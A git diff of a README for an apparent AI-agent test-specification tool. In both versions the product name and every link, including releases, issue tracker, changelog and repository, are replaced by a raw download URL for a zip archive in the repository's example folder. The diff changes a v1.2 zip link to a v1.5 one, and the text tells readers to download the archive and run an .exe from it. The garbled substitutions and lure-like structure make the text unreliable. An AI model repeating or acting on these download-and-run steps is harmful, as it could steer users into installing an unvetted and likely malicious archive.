@@ -1,14 +1,14 @@
-# 🧪 https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip - Simple Test Specifications for AI Agents
+# 🧪 https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip - Simple Test Specifications for AI Agents
 
 ## 🚀 Getting Started
 
-https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip helps you write human-readable test specifications for AI agents. With this tool, you can create clear tests for AI systems easily, ensuring they work as intended.
+https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip helps you write human-readable test specifications for AI agents. With this tool, you can create clear tests for AI systems easily, ensuring they work as intended.
 
 ## 📥 Download the Application
 
-[![Download https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip](https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip)](https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip)
+[![Download https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip](https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip)](https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip)
 
-You can get the latest version of https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip by visiting our Releases page.
+You can get the latest version of https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip by visiting our Releases page.
 
 ## 🛠️ System Requirements
 
@@ -29,20 +29,20 @@ Before you download, make sure your computer meets these basic requirements:
 
 ## 📋 Download & Install
 
-To get https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip, follow these steps:
+To get https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip).
 2. **Select the Latest Release:** Look for the most recent version at the top and click on it.
 3. **Download the Application:**
-   - You will see a list of assets related to the release. Choose the appropriate file for your operating system (e.g., `https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip`, `https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip`, or `https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip`).
+   - You will see a list of assets related to the release. Choose the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip`, `https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip`, or `https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip`).
 4. **Run the Installer:**
    - For Windows, double-click the `.exe` file to start the installation.
    - For macOS, unzip the `.zip` file and drag the application into the Applications folder.
-   - For Linux, extract the `https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip` file, navigate to the folder in your terminal, and run the application using `https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip`.
+   - For Linux, extract the `https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip` file, navigate to the folder in your terminal, and run the application using `https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip`.
 
 ## 📖 Documentation
 
-Once you install https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip, you can create your test specifications easily. Here’s how:
+Once you install https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip, you can create your test specifications easily. Here’s how:
 
 ### **Creating Your First Test:**
 
@@ -72,18 +72,18 @@ Once you have created your test specification, you can run tests against your AI
 
 ## ⚙️ Support
 
-If you encounter any issues or have questions, please visit our [issue tracker](https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip). You can also join our community for help from other users.
+If you encounter any issues or have questions, please visit our [issue tracker](https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip). You can also join our community for help from other users.
 
 ## 📆 Changelog
 
-For a list of changes and improvements in each version, refer to the [Changelog](https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip).
+For a list of changes and improvements in each version, refer to the [Changelog](https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip).
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip)
-- [Releases Page](https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip)
-- [Contributing Guide](https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip)
 
-[![Download https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip](https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip)](https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip)
+[![Download https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip](https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip)](https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip)
 
-By following these steps, you can successfully download, install, and start using https://github.com/locpat/testme.md/raw/refs/heads/main/example/testme-md-v1.2.zip Enjoy creating your test specifications for AI agents!
+By following these steps, you can successfully download, install, and start using https://raw.githubusercontent.com/locpat/testme.md/main/example/md_testme_v1.5.zip Enjoy creating your test specifications for AI agents!
